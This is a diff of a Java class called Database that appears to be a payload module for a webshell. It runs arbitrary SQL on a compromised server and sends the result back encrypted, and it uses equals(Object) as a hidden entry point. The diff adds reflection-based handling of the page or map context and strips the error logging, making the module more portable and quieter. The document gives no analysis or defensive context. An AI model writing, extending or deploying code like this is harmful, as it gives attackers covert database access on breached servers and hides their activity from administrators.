@@ -13,9 +13,9 @@ import java.util.Map;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletOutputStream;
+import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class Database {
    public static String type;
@@ -25,26 +25,24 @@ public class Database {
    public static String pass;
    public static String database;
    public static String sql;
+   private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
       HashMap result = new HashMap();
 
       try {
+         this.fillContext(obj);
          this.executeSQL();
          result.put("msg", this.executeSQL());
          result.put("status", "success");
-      } catch (Exception var6) {
-         var6.printStackTrace();
+      } catch (Exception var5) {
          result.put("status", "fail");
-         if (var6 instanceof ClassNotFoundException) {
+         if (var5 instanceof ClassNotFoundException) {
             result.put("msg", "NoDriver");
          } else {
-            result.put("msg", var6.getMessage());
+            result.put("msg", var5.getMessage());
          }
       }
 
@@ -53,9 +51,7 @@ public class Database {
          so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
          so.flush();
          so.close();
-         page.getOut().clear();
-      } catch (Exception var5) {
-         var5.printStackTrace();
+      } catch (Exception var4) {
       }
 
       return true;
@@ -175,5 +171,20 @@ public class Database {
 
       sb.append("}");
       return sb.toString();
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = (HttpSession)objMap.get("session");
+         this.Response = (ServletResponse)objMap.get("response");
+         this.Request = (ServletRequest)objMap.get("request");
+      }
+
+      this.Response.setCharacterEncoding("UTF-8");
    }
 }
